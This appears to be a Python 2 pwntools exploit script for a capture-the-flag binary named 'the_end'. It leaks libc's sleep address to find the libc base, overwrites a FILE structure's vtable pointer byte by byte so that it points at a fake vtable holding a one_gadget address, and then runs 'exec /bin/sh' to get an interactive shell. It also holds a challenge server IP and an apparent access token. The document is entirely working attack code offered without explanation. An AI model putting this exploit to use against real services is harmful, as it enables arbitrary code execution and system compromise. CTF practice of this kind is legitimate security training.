from pwn import *
context.log_level="debug"

libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
# p = process('the_end')
p = remote('127.0.0.1',1234)

rem = 0
if rem ==1:
    p = remote('150.109.44.250',20002)
    p.recvuntil('Input your token:')
    p.sendline('RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU')

sleep_ad = p.recvuntil(', good luck',drop=True).split(' ')[-1]

libc_base = long(sleep_ad,16) - libc.symbols['sleep']
one_gadget = libc_base + 0xf02b0
vtables =     libc_base + 0x3C56F8

fake_vtable = libc_base + 0x3c5588
target_addr = libc_base + 0x3c55e0

print 'libc_base: ',hex(libc_base)
print 'one_gadget:',hex(one_gadget)
print 'exit_addr:',hex(libc_base + libc.symbols['exit'])

# gdb.attach(p)

for i in range(2):
	p.send(p64(vtables+i))
	p.send(p64(fake_vtable)[i])


for i in range(3):
    p.send(p64(target_addr+i))
    p.send(p64(one_gadget)[i])

p.sendline("exec /bin/sh 1>&0")

p.interactive()
